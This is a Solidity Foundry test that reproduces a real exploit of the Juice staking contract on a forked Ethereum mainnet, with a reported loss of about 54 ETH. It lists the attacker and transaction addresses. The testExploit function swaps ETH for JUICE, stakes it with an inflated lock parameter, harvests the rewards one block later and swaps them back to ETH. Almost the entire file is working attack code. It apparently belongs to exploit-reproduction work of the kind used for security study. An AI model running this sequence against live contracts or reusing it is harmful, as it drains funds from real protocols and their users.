// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~54 ETH
// Attacker : https://etherscan.io/address/0x3fA19214705BC82cE4b898205157472A79D026BE
// Attack Contract : https://etherscan.io/address/0xa8b45dEE8306b520465f1f8da7E11CD8cFD1bBc4
// Vulnerable Contract : https://etherscan.io/address/0x8584ddbd1e28bca4bc6fb96bafe39f850301940e
// Attack Tx : https://etherscan.io/tx/0xc9b2cbc1437bbcd8c328b6d7cdbdae33d7d2a9ef07eca18b4922aac0430991e7

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x8584ddbd1e28bca4bc6fb96bafe39f850301940e#code

interface IStake {
    function harvest(uint256) external;
    function stake(uint256, uint256) external;
}

contract Juice is Test {
    uint256 blocknumToForkFrom = 19395636;
    IERC20 JUICE = IERC20(0xdE5d2530A877871F6f0fc240b9fCE117246DaDae);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IStake JuiceStaking = IStake(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e);
    
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function setUp() public {

        vm.createSelectFork("mainnet", blocknumToForkFrom);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker ETH balance before exploit", address(this).balance, 18);

        //stake 0.5 ETH
        ETHtoJUICE(0.5 ether);
        JUICE.approve(address(JuiceStaking), type(uint256).max);
        JuiceStaking.stake(JUICE.balanceOf(address(this)),3000_000_000);
        
        // harvest JUICE token a block later
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
        JuiceStaking.harvest(0);
        JUICE.approve(address(Router), type(uint256).max);
        JUICEtoETH();

        // Log balances after exploit
        emit log_named_decimal_uint("[End] Attacker ETH Balance After exploit", address(this).balance, 18);
    }

    function ETHtoJUICE(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(JUICE);
        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0, path, address(this), block.timestamp + 60
        );
    }

    function JUICEtoETH() internal {
        address[] memory path = new address[](2);
        path[0] = address(JUICE);
        path[1] = address(WETH);
        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            JUICE.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60
        );
    }

    fallback() external payable {}
}
